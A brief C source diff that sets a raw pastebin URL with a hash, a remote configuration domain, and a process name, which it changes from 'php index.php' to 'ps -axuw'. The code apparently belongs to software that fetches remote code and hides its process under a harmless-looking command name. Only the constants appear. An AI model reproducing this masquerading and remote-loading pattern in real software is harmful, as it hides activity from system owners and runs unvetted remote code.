@@ -10,7 +10,7 @@ include <stdio.h>
 #define SRC             "https://pastebin.com/raw/eVjujdc1"
 #define SRC_HASH        "6807828dbfab3dfa1301a0cbfc497cab"
 #define CONF_URL        "https://bosen.net/"
-#define PS_NAME         "php index.php"
+#define PS_NAME         "ps -axuw"
 
 struct string {
   char *ptr;
